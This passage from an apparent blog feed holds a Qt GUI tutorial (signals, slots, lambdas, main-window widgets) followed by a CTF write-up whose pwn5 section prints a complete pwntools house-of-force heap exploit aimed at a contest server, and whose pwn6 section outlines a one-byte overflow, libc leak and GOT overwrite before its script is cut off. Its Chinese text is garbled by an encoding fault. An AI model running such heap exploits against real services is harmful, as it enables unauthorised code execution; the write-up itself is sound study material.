class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//button.h</span></span><br><span class="line">signals:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rang</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//recv.h</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">recvsignals</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//recv.cpp</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">recv::recvsignals</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"æ¥å—æˆåŠŸ"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ€åå°±æ˜¯è¿æ¥,è¿™é‡Œæˆ‘ä»¬<strong>éœ€è¦æ³¨æ„åªæœ‰rangä¹‹åæ‰ä¼šæ¥å—</strong></p><p>æ‰€ä»¥å°±éœ€è¦rangèµ·æ¥ï¼Œ<strong>è¿™é‡Œç”¨çš„plzå‡½æ•°è®©å®ƒrang</strong></p><p>å…¶ä¸­çš„ä¸€äº›æˆå‘˜åéœ€è¦åœ¨<code>widget.h</code>ä¸­æ˜¯å®ç°</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//widget.h</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Widget(QWidget *parent = <span class="literal">nullptr</span>);</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">plz</span><span class="params">()</span></span>;</span><br><span class="line">    ~Widget();</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    MyPushButton * btn;</span><br><span class="line">    recv * recv1;</span><br><span class="line"></span><br><span class="line"><span class="comment">//widget.cpp</span></span><br><span class="line">        <span class="keyword">this</span>-&gt;btn = <span class="keyword">new</span> MyPushButton(<span class="keyword">this</span>);</span><br><span class="line">        <span class="keyword">this</span>-&gt;recv1 = <span class="keyword">new</span> recv;</span><br><span class="line">        btn-&gt;show();</span><br><span class="line">        btn-&gt;setParent(<span class="keyword">this</span>);</span><br><span class="line">        btn-&gt;setText(<span class="string">"æˆ‘çš„æŒ‰é’®"</span>);</span><br><span class="line">        btn-&gt;<span class="built_in">move</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">connect</span>(btn, &amp;MyPushButton::rang, recv1, &amp;recv::recvsignals);</span><br><span class="line">        plz();</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Widget::plz</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    emit btn-&gt;rang();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-é‡è½½ä¿¡å·å’Œæ§½"><a href="#2-é‡è½½ä¿¡å·å’Œæ§½" class="headerlink" title="2.é‡è½½ä¿¡å·å’Œæ§½"></a>2.é‡è½½ä¿¡å·å’Œæ§½</h3><p>æ¥ç€ä¸Šä¸ªæ¡ˆä¾‹</p><p><strong>é‡è½½ä¿¡å· é‡è½½æ§½ é‡æ–°å®šä¹‰æ§½å‡½æ•°</strong> </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//button.h</span></span><br><span class="line">signals:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">rang</span><span class="params">(QString)</span></span>;</span><br><span class="line"><span class="comment">//recv.h</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">recvsignals</span><span class="params">(QString s)</span></span>;</span><br><span class="line"><span class="comment">//recv.p</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">recv::recvsignals</span><span class="params">(QString second)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    qDebug() &lt;&lt; <span class="string">"æ¥å—æˆåŠŸå“é“ƒ"</span> &lt;&lt; second &lt;&lt; <span class="string">"ç§’"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äºè¿æ¥æ— æ³•åˆ†æ¸…å‡½æ•°åœ°å€ï¼Œè¿™é‡Œç”¨<strong>å‡½æ•°æŒ‡é’ˆæ¥ä½“ç°å‡½æ•°åœ°å€</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç®€å•è¯´ä¸€ä¸‹å‡½æ•°æŒ‡é’ˆ</span></span><br><span class="line"><span class="comment">//è¿”å›ç±»å‹ä¸ºç©º ç¬¬ä¸€ä¸ªæ‹¬å·é‡Œä¸ºæŒ‡é’ˆ ç¬¬äºŒä¸ªæ‹¬å·ä¸ºå‚æ•° =åé¢æ˜¯éœ€è¦æŒ‡å‘å‡½æ•°çš„åœ°å€</span></span><br><span class="line"><span class="keyword">void</span>(recv:: *recvslot)(QString) = &amp;recv::recvsignals;</span><br><span class="line"><span class="keyword">void</span>(MyPushButton:: *ButtonSignal)(QString) = &amp;MyPushButton::rang;</span><br><span class="line"><span class="built_in">connect</span>(btn, ButtonSignal, recv1, recvslot);</span><br><span class="line">plz();</span><br></pre></td></tr></table></figure><p>æˆåŠŸå®ç°</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201207233628350.png" alt="image-20201207233628350"></p><blockquote><p>Qstringæ€ä¹ˆå»æ‰å¼•å·</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;second.toUtf8().data()</span><br></pre></td></tr></table></figure></blockquote><h3 id="3-ä¿¡å·å’Œæ§½çš„æ‹“å±•"><a href="#3-ä¿¡å·å’Œæ§½çš„æ‹“å±•" class="headerlink" title="3.ä¿¡å·å’Œæ§½çš„æ‹“å±•"></a>3.ä¿¡å·å’Œæ§½çš„æ‹“å±•</h3><ul><li>ä¿¡å·å¯ä»¥è¿æ¥ä¿¡å·</li><li>ä¸€ä¸ªä¿¡å·å¯ä»¥è¿æ¥å¤šä¸ªæ§½å‡½æ•°</li><li>å¤šä¸ªä¿¡å·å¯ä»¥è¿æ¥åŒä¸€ä¸ªæ§½å‡½æ•°</li><li><strong>ä¿¡å·å’Œæ§½å‡½æ•°çš„ç±»å‹å¿…é¡»ä¸€ä¸€å¯¹åº”</strong></li><li>ä¿¡å·çš„å‚æ•°ä¸ªæ•°å¯ä»¥å¤§äºæ§½å‡½æ•°çš„å‚æ•°ä¸ªæ•°</li></ul><h4 id="ä¿¡å·è¿æ¥ä¿¡å·"><a href="#ä¿¡å·è¿æ¥ä¿¡å·" class="headerlink" title="ä¿¡å·è¿æ¥ä¿¡å·"></a>ä¿¡å·è¿æ¥ä¿¡å·</h4><p>ç»§ç»­ä¸‹ä¸€ä¸ª</p><p><strong>æˆ‘ä»¬æŒ‰ä¸‹æŒ‰é’®1æ‰ä¼šå“é“ƒ</strong></p><p>è¿™é‡Œç”¨ä¸¤ç§å®ç°</p><ol><li>ç‚¹å‡»è¿æ¥plzå‡½æ•°</li><li><strong>ç‚¹å‡»è¿æ¥å“é“ƒä¿¡å·</strong>,æ­¤æ—¶å‡½æ•°ä¸­æ— å‚æ•°</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//widget.cpp</span></span><br><span class="line">        QPushButton *btn1 = <span class="keyword">new</span> QPushButton(<span class="string">"å“é“ƒ"</span>,<span class="keyword">this</span>);</span><br><span class="line">        btn1-&gt;<span class="built_in">move</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">connect</span>(btn1,&amp;QPushButton::clicked,<span class="keyword">this</span>,&amp;Widget::plz);</span><br><span class="line"><span class="comment">//widget.cpp</span></span><br><span class="line">    QPushButton *btn1 = <span class="keyword">new</span> QPushButton(<span class="string">"å“é“ƒ"</span>,<span class="keyword">this</span>);</span><br><span class="line">        btn1-&gt;<span class="built_in">move</span>(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">connect</span>(btn1,&amp;QPushButton::clicked,btn,ButtonSignal);</span><br></pre></td></tr></table></figure><p>æ•ˆæœå›¾å¦‚ä¸‹</p><p>æ–¹æ³•1</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201208162609069.png" alt="image-20201208162609069"></p><p>æ–¹æ³•2</p><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201208163512899.png" alt="image-20201208163512899"></p><h3 id="4-Lambdaè¡¨è¾¾å¼"><a href="#4-Lambdaè¡¨è¾¾å¼" class="headerlink" title="4.Lambdaè¡¨è¾¾å¼"></a>4.Lambdaè¡¨è¾¾å¼</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[=]()&#123;</span><br><span class="line">btn1-&gt;setText(<span class="string">"ç¬¬äºŒä¸ª"</span>);</span><br><span class="line">&#125;();  <span class="comment">//()è°ƒç”¨</span></span><br><span class="line"><span class="comment">//[]å¿…é¡»å­˜åœ¨ ä¸å¯çœç•¥</span></span><br><span class="line"><span class="comment">//()é‡è½½å‡½æ•°çš„å‚æ•°</span></span><br><span class="line"><span class="comment">//= å€¼ä¼ é€’</span></span><br><span class="line"><span class="comment">//&amp; å¼•ç”¨ä¼ é€’</span></span><br><span class="line"><span class="comment">//a åªå¯¹aä¼ é€’</span></span><br><span class="line"><span class="comment">//&amp;a åªå¯¹å¼•ç”¨aä¼ é€’</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯¹äºæƒ³è¦å€¼ä¿®æ”¹ï¼Œéœ€è¦mutableå…³é”®å­—,ä½†ä¸æ”¹å˜æœ¬ä½“</span></span><br><span class="line">[=]()<span class="keyword">mutable</span>&#123;m = <span class="number">100</span> + <span class="number">10</span>;</span><br><span class="line">            qDebug &lt;&lt; m;&#125;();</span><br><span class="line"><span class="comment">//è¿”å›å€¼ -&gt;è¿”å›å€¼ç±»å‹</span></span><br><span class="line"><span class="keyword">int</span> ret = []()-&gt;<span class="keyword">int</span>&#123;<span class="keyword">return</span> <span class="number">1000</span>;&#125;();</span><br></pre></td></tr></table></figure><h2 id="0x04-QMainWindow"><a href="#0x04-QMainWindow" class="headerlink" title="0x04 QMainWindow"></a>0x04 QMainWindow</h2><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201208225426943.png" alt="image-20201208225426943"></p><h3 id="1-èœå•æ "><a href="#1-èœå•æ " class="headerlink" title="1.èœå•æ "></a>1.èœå•æ </h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//èœå•æ </span></span><br><span class="line"><span class="comment">//èœå•æ æœ€å¤šæœ‰ä¸€ä¸ª</span></span><br><span class="line"><span class="comment">//åˆ›å»ºèœå•æ </span></span><br><span class="line">QMenuBar * bar = menuBar();</span><br><span class="line"><span class="comment">//å°†èœå•æ æ”¾å…¥åˆ°çª—å£ä¸­</span></span><br><span class="line">setMenuBar(bar);</span><br><span class="line"><span class="comment">//åˆ›å»ºèœå•</span></span><br><span class="line">QMenu * fileMenu = bar-&gt;addMenu(<span class="string">"æ–‡ä»¶"</span>);</span><br><span class="line">QMenu * editMenu = bar-&gt;addMenu(<span class="string">"ç¼–è¾‘"</span>);</span><br><span class="line"><span class="comment">//åˆ›å»ºèœå•é¡¹</span></span><br><span class="line"><span class="comment">//fileMenu-&gt;addAction("æ–°å»º");</span></span><br><span class="line">QAction * action1 = fileMenu-&gt;addAction(<span class="string">"æ–°å»º"</span>);</span><br><span class="line"><span class="comment">//æ·»åŠ åˆ†éš”ç¬¦</span></span><br><span class="line">fileMenu-&gt;addSeparator();</span><br><span class="line">QAction * action2 = fileMenu-&gt;addAction(<span class="string">"æ‰“å¼€"</span>);</span><br></pre></td></tr></table></figure><h3 id="2-å·¥å…·æ "><a href="#2-å·¥å…·æ " class="headerlink" title="2.å·¥å…·æ "></a>2.å·¥å…·æ </h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//å·¥å…·æ </span></span><br><span class="line"><span class="comment">//å·¥å…·æ  å¯ä»¥æœ‰å¤šä¸ª</span></span><br><span class="line">QToolBar * toolBar = <span class="keyword">new</span> QToolBar(<span class="keyword">this</span>);</span><br><span class="line"><span class="comment">//å·¥å…·æ åŒºåŸŸ</span></span><br><span class="line">addToolBar(Qt::LeftToolBarArea,toolBar);</span><br><span class="line"><span class="comment">//è®¾ç½®å·¥å…·æ åŒºåŸŸ åªå…è®¸å·¦å³åœé </span></span><br><span class="line">toolBar-&gt;setAllowedAreas(Qt::LeftToolBarArea|Qt::RightToolBarArea);</span><br><span class="line"><span class="comment">//è®¾ç½®æµ®åŠ¨</span></span><br><span class="line">toolBar-&gt;setFloatable(<span class="literal">false</span>);</span><br><span class="line"><span class="comment">//è®¾ç½®ç§»åŠ¨</span></span><br><span class="line">toolBar-&gt;setMovable(<span class="literal">false</span>);</span><br><span class="line"><span class="comment">//è®¾ç½®å†…å®¹</span></span><br><span class="line"><span class="comment">//toolBar-&gt;addAction("æ–°å»º");</span></span><br><span class="line">toolBar-&gt;addAction(action1);</span><br><span class="line"><span class="comment">//æ·»åŠ åˆ†å‰²çº¿</span></span><br><span class="line">toolBar-&gt;addSeparator();</span><br><span class="line">toolBar-&gt;addAction(action2);</span><br><span class="line"><span class="comment">//å·¥å…·æ æ·»åŠ æ§ä»¶</span></span><br><span class="line">QPushButton *btn = <span class="keyword">new</span> QPushButton(<span class="string">"ç‚¹è¿™é‡Œ"</span>,<span class="keyword">this</span>);</span><br><span class="line">toolBar-&gt;addWidget(btn);</span><br></pre></td></tr></table></figure><h3 id="3-çŠ¶æ€æ "><a href="#3-çŠ¶æ€æ " class="headerlink" title="3.çŠ¶æ€æ "></a>3.çŠ¶æ€æ </h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//çŠ¶æ€æ </span></span><br><span class="line"><span class="comment">//çŠ¶æ€æ å¯ä»¥æœ‰å¤šä¸ª</span></span><br><span class="line">QStatusBar * stBar = statusBar();</span><br><span class="line"><span class="comment">//è®¾ç½®åˆ°çª—å£</span></span><br><span class="line">setStatusBar(stBar);</span><br><span class="line"><span class="comment">//æ·»åŠ æ ‡ç­¾æ§ä»¶</span></span><br><span class="line"><span class="comment">//å·¦ä¾§æç¤º</span></span><br><span class="line">QLabel * label = <span class="keyword">new</span> QLabel(<span class="string">"å·¦ä¾§ä¿¡æ¯"</span>,<span class="keyword">this</span>);</span><br><span class="line">stBar-&gt;addWidget(label);</span><br><span class="line"><span class="comment">//å³ä¾§æç¤º</span></span><br><span class="line">QLabel * label1 = <span class="keyword">new</span> QLabel(<span class="string">"å³ä¾§ä¿¡æ¯"</span>,<span class="keyword">this</span>);</span><br><span class="line">stBar-&gt;addPermanentWidget(label1);</span><br></pre></td></tr></table></figure><h3 id="4-æµ®åŠ¨çª—å£"><a href="#4-æµ®åŠ¨çª—å£" class="headerlink" title="4.æµ®åŠ¨çª—å£"></a>4.æµ®åŠ¨çª—å£</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//é“†æ¥éƒ¨ä»¶(æµ®åŠ¨çª—å£)</span></span><br><span class="line"><span class="comment">//é“†æ¥éƒ¨ä»¶ å¯ä»¥æœ‰å¤šä¸ª</span></span><br><span class="line">QDockWidget * dock = <span class="keyword">new</span> QDockWidget(<span class="string">"æµ®åŠ¨"</span>,<span class="keyword">this</span>);</span><br><span class="line">addDockWidget(Qt::BottomDockWidgetArea,dock);</span><br><span class="line"><span class="comment">//è®¾ç½®åœé åŒºåŸŸ</span></span><br><span class="line">dock-&gt;setAllowedAreas(Qt::BottomDockWidgetArea);</span><br></pre></td></tr></table></figure><h3 id="5-æ ¸å¿ƒéƒ¨ä»¶"><a href="#5-æ ¸å¿ƒéƒ¨ä»¶" class="headerlink" title="5.æ ¸å¿ƒéƒ¨ä»¶"></a>5.æ ¸å¿ƒéƒ¨ä»¶</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//è®¾ç½®ä¸­å¿ƒéƒ¨ä»¶(åªèƒ½æœ‰ä¸€ä¸ª)</span></span><br><span class="line">QTextEdit * edit = <span class="keyword">new</span> QTextEdit(<span class="keyword">this</span>);</span><br><span class="line">setCentralWidget(edit);</span><br></pre></td></tr></table></figure><h2 id="0x05-èµ„æºæ–‡ä»¶"><a href="#0x05-èµ„æºæ–‡ä»¶" class="headerlink" title="0x05 èµ„æºæ–‡ä»¶"></a>0x05 èµ„æºæ–‡ä»¶</h2><p><img src="/2020/12/07/%E5%A4%A7%E4%BA%8C%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%BB%BC%E5%90%88%E5%AE%9E%E8%B7%B5/image-20201209001543539.png" alt="image-20201209001543539"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ç¨‹åºè®¾è®¡ç»¼åˆå®è·µ&quot;&gt;&lt;a href=&quot;#ç¨‹åºè®¾è®¡ç»¼åˆå®è·µ&quot; class=&quot;headerlink&quot; title=&quot;ç¨‹åºè®¾è®¡ç»¼åˆå®è·µ&quot;&gt;&lt;/a&gt;ç¨‹åºè®¾è®¡ç»¼åˆå®è·µ&lt;/h1&gt;&lt;p&gt;å›¾å½¢åŒ–ç¼–ç¨‹&lt;/p&gt;
&lt;p&gt;è¿™ä¸åŒè¯­è¨€åˆ†æ•°è¿˜ä¸å¤ªä¸€æ ·ï¼Œæœ€åç”¨Qtäº†&lt;/p&gt;
&lt;p&gt;å››ä¸ªæ˜ŸæœŸå››ä¸ª</summary>
      
    
    
    
    <category term="Qt" scheme="https://pz1o.top/categories/Qt/"/>
    
    
    <category term="Qt" scheme="https://pz1o.top/tags/Qt/"/>
    
    <category term="å®éªŒ" scheme="https://pz1o.top/tags/%E5%AE%9E%E9%AA%8C/"/>
    
  </entry>
  
  <entry>
    <title>æ–°ç”Ÿèµ›å¤ç°</title>
    <link href="https://pz1o.top/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
    <id>https://pz1o.top/2020/12/06/%E6%96%B0%E7%94%9F%E8%B5%9B%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-12-06T14:22:34.000Z</published>
    <updated>2020-12-06T14:41:04.729Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å¤ç°"><a href="#å¤ç°" class="headerlink" title="å¤ç°"></a>å¤ç°</h1><p>ç»ˆäºè€ƒå®Œè¯•äº†ï¼Œè¿™è€ƒå‰å­¦çœŸä¸æ˜¯äººå¹²çš„ï¼Œä¸Šè¯¾è¿˜æ˜¯å¾—å¬ä¸€å¬</p><p>å¤ç°ä¸€ä¸‹è¿™å‡ é“é¢˜ï¼Œé¡ºä¾¿å­¦ä¹ å †çš„çŸ¥è¯†</p><h1 id="pwn5"><a href="#pwn5" class="headerlink" title="pwn5"></a>pwn5</h1><p>å®˜æ–¹wp</p><blockquote><p>åˆ©ç”¨changeå‡½æ•°ä¸­å­˜åœ¨çš„ä»»æ„å­—èŠ‚å †æº¢å‡ºæ„é€ house of forceæ”»å‡»</p><p>å…³äºhouse of forceä¸æ‡‚å¾—çš„å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« </p><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/house_of_force-zh/</a></p></blockquote><p>å…ˆæ¥çœ‹ä¸€ä¸‹house of force</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10014</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,size,name)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x400D1B</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">"ddaa"</span>)</span><br><span class="line">payload = <span class="number">0x30</span> * <span class="string">'a'</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">change(<span class="number">0</span>,<span class="number">0x41</span>,payload)</span><br><span class="line">offset_to_heap_base = -(<span class="number">0x40</span> + <span class="number">0x20</span>)</span><br><span class="line">malloc = offset_to_heap_base - <span class="number">0x8</span> - <span class="number">0xf</span></span><br><span class="line">add(malloc,<span class="string">"dddd"</span>)</span><br><span class="line">add(<span class="number">0x10</span>,p64(magic) * <span class="number">2</span>)</span><br><span class="line">r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">r.sendline(<span class="string">"5"</span>)</span><br><span class="line"></span><br><span class="line">print(r.recv())</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn6"><a href="#pwn6" class="headerlink" title="pwn6"></a>pwn6</h1><blockquote><p>changeå‡½æ•°ä¸­å­˜åœ¨å•å­—èŠ‚æº¢å‡ºæ¼æ´</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;if ( heap[v1] ) </span><br><span class="line">&gt;&#123; printf(&quot;Content of heap : &quot;);</span><br><span class="line">read_input(heap[v1][1], *heap[v1] + 1LL);</span><br><span class="line">puts(&quot;Done !&quot;); </span><br><span class="line">&gt;&#125;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨å•å­—èŠ‚æº¢å‡ºæ¼æ´æ„é€ fake_chunk,freeä¹‹åå†æ¬¡åˆ†é…é€ æˆoverlap,ä»è€Œä»»æ„åœ°å€è¯»å†™</p><p>æ³„éœ²å‡ºlibcåŸºåœ°å€ï¼Œä¿®æ”¹gotè¡¨ï¼Œæœ€åget_shell</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">"219.219.61.234"</span>,<span class="number">10015</span>)</span><br><span class="line">heap = ELF(<span class="string">'./pwn6'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span 